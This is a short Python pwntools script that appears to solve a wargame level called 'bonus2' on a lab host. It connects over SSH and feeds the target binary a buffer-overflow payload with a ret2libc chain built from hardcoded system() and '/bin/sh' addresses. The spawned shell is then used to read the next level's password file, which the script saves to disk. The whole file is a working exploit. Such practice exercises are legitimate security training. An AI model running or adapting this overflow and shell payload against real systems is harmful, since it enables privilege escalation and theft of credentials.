#!/usr/bin/python3

from pwn import *

host = '10.11.248.120'
port = 4242
user = 'bonus2'
password = open("../bonus1/flag", "rb").read()

with ssh(user=user, host=host, port=port, password=password) as s:

    SYSTEM  = 0xb7e6b060
    BINSH   = 0xb7f8cc58

    arg1 = b'a' * 40
    arg2 = b'b' * 18 + p32(SYSTEM) + b'aaaa' + p32(BINSH) 

    p = s.process(["./bonus2", arg1, arg2], env = {'LANG':'fi'})

    def ssh_send(line):
        if type(line) == str:
            line = line.encode("utf-8")
        elif type(line) != bytes:
            print("[x] Wrong data format !")
            raise ValueError
        print(f"[x] Sending: {line!r}")
        p.sendline(line)

    def ssh_recv(timeout = 1.0) -> str:
        data = p.recv(timeout=timeout)
        text = data.decode(errors='ignore')
        print(f"[x] Received: {text!r}")
        return text

    def wait_for_shell():
        while True:
            output = ssh_recv()
            if output == "$ " or output == "":
                break
    
    try:
        
        wait_for_shell()
        ssh_send("cat /home/user/bonus3/.pass")
        flag = ssh_recv().split('\n')[0]
    
    except ValueError:
        exit(1)

    print(f"\nbonus3 password: {flag}\n")

    flagfile = open("flag", "wb")
    flagfile.write(flag.encode("utf-8"))

    s.close()

